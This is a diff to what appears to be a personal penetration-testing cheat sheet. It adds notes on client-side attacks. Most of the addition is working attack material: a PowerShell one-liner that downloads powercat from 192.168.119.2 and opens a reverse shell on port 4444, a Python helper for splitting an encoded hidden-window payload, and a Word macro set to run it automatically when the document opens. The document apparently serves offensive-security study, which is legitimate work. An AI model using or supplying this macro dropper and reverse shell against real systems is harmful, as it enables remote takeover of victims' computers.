@@ -498,3 +498,34 @@ zip2john file.zip > zip.john
 john zip.john
 Port Kill
 sudo fuser -k 443/tcp
+Client Side Attacks can be done through:
+- HTML Application
+- Canarytokens then use the following link to check victim's browser
+-     https://explore.whatismybrowser.com/useragents/parse/
+- cross-site scripting (stored)
+- Microsoft Word Macros
+-     Sub AutoOpen()  MyMacro  End Sub
+-     Sub Document_Open()  MyMacro  End Sub
+- encode the following PowerShell reverse shell
+-     IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.2/powercat.ps1');powercat -c 192.168.119.2 -p 4444 -e powershell
+- use the following function to split the payload
+str = "powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAdwA..."
+n = 50
+for i in range(0, len(str), n):
+print("Str = Str + " + '"' + str[i:i+n] + '"')
+- paste the payload from the function in the macro
+ Sub MyMacro()
+ Dim Str As String
+ 
+ Str = Str + "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGU"
+ Str = Str + "AdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAd"
+ Str = Str + "AAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwB"
+ ...
+ Str = Str + "QBjACAAMQA5ADIALgAxADYAOAAuADEAMQA4AC4AMgAgAC0AcAA"
+ Str = Str + "gADQANAA0ADQAIAAtAGUAIABwAG8AdwBlAHIAcwBoAGUAbABsA"
+ Str = Str + "A== "
+ CreateObject("Wscript.Shell").Run Str
+End Sub
+
+- Windows Library Files
+- 
